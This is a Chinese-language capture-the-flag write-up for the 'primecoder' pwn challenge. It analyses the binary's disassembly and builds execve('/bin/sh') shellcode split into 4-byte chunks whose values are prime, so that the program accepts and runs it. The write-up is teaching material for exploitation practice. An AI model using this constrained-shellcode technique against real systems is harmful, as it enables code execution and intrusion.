## 大致分析检查
先走一遍流程：checksec  ida 

```
┌──(kali㉿helloeveryone)-[~/ctf/pwn/q31_primecoder]
└─$ checksec primecoder
[*] '/home/kali/ctf/pwn/q31_primecoder/primecoder'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
    FORTIFY:  Enabled
```

在ida里F5失效，锁定那一行，分析汇编

```nasm
    call rbp
```

结合上下文来看，应该是要在rbp处执行shellcode

## 程序流程分析

首先应清楚linux-amd64调用函数传参约定

### 入参

- 在参数都是小于等于 16 字节的整数/枚举/结构体时，前六个参数分别由 **RDI、RSI、RDX、RCX、R8、R9** ***（这部分是重点，有助于看懂本题涉及代码）*** 传递（超过 8 字节的用连续的两个寄存器），剩下的参数用栈传递（参数在内存中的相对位置恰好和参数实际位置一致）。小于 64 位的值占用寄存器的低位，高位数据无效。
- 在参数都是浮点时，大致和前面一样，不同的是前八个参数用的寄存器是 xmm0～xmm7。
- 如果是整形和浮点混用，那么依次用整形寄存器和浮点寄存器传递，直到把这 6+8 个寄存器用完为止。
- 在参数存在大于 16 字节的结构体是直接用栈传递。

### 返回值

- 被调用函数的返回值是64位以内（包括64位）的整形或指针时，则返回值会被存放于 RAX，如果返回值是128位的，则高64位放入 RDX；
- 如果返回值是浮点值，则返回值存放在XMM0；
- 更大的返回值(比如结构体)，由调用方在栈上分配空间，并由 RCX 持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用 RDI，RSI，RDX，R8，R9，5个寄存器，其余参数通过栈传递。函数调用结束后，RAX 返回该空间的指针（即函数调用开始时的 RCX 值）。

### 正式分析

```nasm
.text:0000000000400560 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000400560                 public main
.text:0000000000400560 main            proc near               ; DATA XREF: _start+1D↓o
.text:0000000000400560
.text:0000000000400560 var_42C         = dword ptr -42Ch
.text:0000000000400560 var_41C         = qword ptr -41Ch
.text:0000000000400560
.text:0000000000400560 ; __unwind {
.text:0000000000400560                 push    r12
.text:0000000000400562                 push    rbp
.text:0000000000400563                 xor     ecx, ecx        ; n
.text:0000000000400565                 push    rbx
.text:0000000000400566                 mov     edx, 2          ; modes
.text:000000000040056B                 xor     esi, esi        ; buf
.text:000000000040056D                 xor     ebx, ebx
.text:000000000040056F                 sub     rsp, 420h
.text:0000000000400576                 mov     rdi, cs:stdin@@GLIBC_2_2_5 ; stream
.text:000000000040057D                 lea     rbp, [rsp+32]
.text:0000000000400582                 lea     r12, [rsp+28]
.text:0000000000400587                 call    _setvbuf
.text:000000000040058C                 mov     rdi, cs:__bss_start ; stream
.text:0000000000400593                 xor     ecx, ecx        ; n
.text:0000000000400595                 mov     edx, 2          ; modes
.text:000000000040059A                 xor     esi, esi        ; buf
.text:000000000040059C                 call    _setvbuf
.text:00000000004005A1                 lea     rsi, aBufferP   ; "buffer = %p.\n"
.text:00000000004005A8                 mov     rdx, rbp
.text:00000000004005AB                 mov     edi, 1
.text:00000000004005B0                 xor     eax, eax
.text:00000000004005B2                 call    ___printf_chk
.text:00000000004005B7
.text:00000000004005B7 loc_4005B7:                             ; CODE XREF: main+BF↓j
.text:00000000004005B7                 lea     rdi, format     ; "%u"
.text:00000000004005BE                 xor     eax, eax
.text:00000000004005C0                 mov     rsi, r12
.text:00000000004005C3                 call    _scanf
.text:00000000004005C8                 inc     eax
.text:00000000004005CA                 cmp     eax, 1
.text:00000000004005CD                 jbe     short loc_400621
.text:00000000004005CF                 mov     edi, [rsp+28]   ; __int64
.text:00000000004005D3                 mov     [rsp+12], edi
.text:00000000004005D7                 call    _Z6millerx      ; miller(long long)
.text:00000000004005DC                 test    al, al
.text:00000000004005DE                 mov     edx, [rsp+12]   ; edx为input
.text:00000000004005E2                 jz      short loc_400606
.text:00000000004005E4                 lea     rsi, aGoodUIsPrime ; "Good! %u is prime.\n"
.text:00000000004005EB                 mov     edi, 1
.text:00000000004005F0                 xor     eax, eax
.text:00000000004005F2                 call    ___printf_chk
.text:00000000004005F7                 mov     edx, [rsp+28]
.text:00000000004005FB                 movsxd  rax, ebx
.text:00000000004005FE                 inc     ebx             ; 循环次数
.text:0000000000400600                 mov     [rsp+rax*4+32], edx ; 第一次rax=1
.text:0000000000400604                 jmp     short loc_400619
.text:0000000000400606 ; ---------------------------------------------------------------------------
.text:0000000000400606
.text:0000000000400606 loc_400606:                             ; CODE XREF: main+82↑j
.text:0000000000400606                 lea     rsi, aBadUIsNotPrime ; "Bad! %u is not prime.\n"
.text:000000000040060D                 mov     edi, 1
.text:0000000000400612                 xor     eax, eax
.text:0000000000400614                 call    ___printf_chk
.text:0000000000400619
.text:0000000000400619 loc_400619:                             ; CODE XREF: main+A4↑j
.text:0000000000400619                 cmp     ebx, 255
.text:000000000040061F                 jle     short loc_4005B7
.text:0000000000400621
.text:0000000000400621 loc_400621:                             ; CODE XREF: main+6D↑j
.text:0000000000400621                 call    rbp
.text:0000000000400623                 add     rsp, 1056
.text:000000000040062A                 xor     eax, eax
.text:000000000040062C                 pop     rbx
.text:000000000040062D                 pop     rbp
.text:000000000040062E                 pop     r12
.text:0000000000400630                 retn
.text:0000000000400630 ; } // starts at 400560
.text:0000000000400630 main            endp
```

先观察rbp，其最后一次被改变是在 `0x000000000040057D` ，
```nasm
lea     rbp, [rsp+32]
```
这也是将buffer的地址加载到rbp里

再继续分析流程，`_scanf` 读入一个4字节无符号整数到rsi寄存器中存储的地址，即上一步r12的地址（涉及的代码如下），
```nasm
lea     r12, [rsp+28]
...
mov     rsi, r12
```
若输入非空则将那个数传给edi和地址 `[rsp+12]` ，并代入函数 `_Z6millerx` 做判断。判断成功则把那个数传给edx并写入 `[rsp+rax*4+32]` ，即buffer

总结一下，即只有被该程序判定为质数的4字节无符号整数才能被存入buffer并在输入为空后被执行，即我们得让shellcode可以被分成许多4字节质数输入内存。

## 构造shellcode

有用的网站：
- [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm#disassembly)

要用syscall调用shell，各个寄存器的值应是：

- rax : 0x3b (系统调用号)
- rdi : rsp的地址 (先要把/bin//sh压入栈顶)
- rdx : 0
- rsi : 0

可以考虑将shellcode分解成一系列小片段，较少连续性，易于形成质数。

- 注意：程序为小端序，shellcode执行也是从低地址到高地址，因此对应整数是倒过来看的
  
例如下面：

```nasm
    cdq         ;0x99
    push rdx    ;0x52
    cdq         ;0x99
    pop rsi     ;0x5e

    ;对应的就是0x5e995299
```

下面是作者找到的一些质数对应的汇编代码，基本覆盖全面

```nasm
    cdq
    push rdx
    cdq
    pop rsi

    cdq
    xor rax,rax

    cdq
    cdq
    push rdx
    cdq

    cdq
    push rdx
    pop rdi
    push rdx

    pop rdi
    pop rdi
    pop r9

    shl r9,0x20

    cdq
    shr r9,1

    ;2 int
    cdq
    nop
    mov r9d,0x68732f2f

    ;3 int
    pop rdi
    cdq
    nop
    add r9d,0x6e69622f
    cdq
    nop

    ;3
    pop rdi
    mov dl,0x0c
    add r9,0x6e69622f
    cdq
    nop

    cdq
    push r9
    nop

    cdq
    pop r10
    nop

    cdq
    add rdi,r9

    cdq
    push rsp
    mov dl,0x16

    syscall
    mov dl,0x5

    mov bl,0x2
    mov al,0x3b
```

### 寻找技巧

- 多运用单字节、双字节的字节码，如:
  ```nasm
  cdq       ;0x99
  nop       ;0x90
  pop rdi   ;0x5f
  push r9   ;0x41 0x51
  ```
- 对一些需要凑成两到三个质数的可以用特定指令进行爆破
  ```nasm
  mov dl,0x??   ;0xb2 0x??  ??相同
  ;同理，可以是bl等，但需是无用的寄存器
  ```

### 完整shellcode

```nasm
    cdq
    push rdx
    cdq
    pop rsi

    cdq
    push rdx
    pop rdi
    push rdx

    cdq
    nop
    mov r9d,0x68732f2f

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    cdq
    shr r9,1

    shl r9,0x20

    pop rdi
    mov dl,0x0c
    add r9,0x6e69622f
    cdq
    nop

    cdq
    push r9
    nop

    cdq
    push rsp
    mov dl,0x16

    pop rdi
    cdq
    nop
    add r9d,0x6e69622f
    cdq
    nop

    cdq
    xor rax,rax

    mov bl,0x2
    mov al,0x3b

    syscall
    mov dl,0x5
```
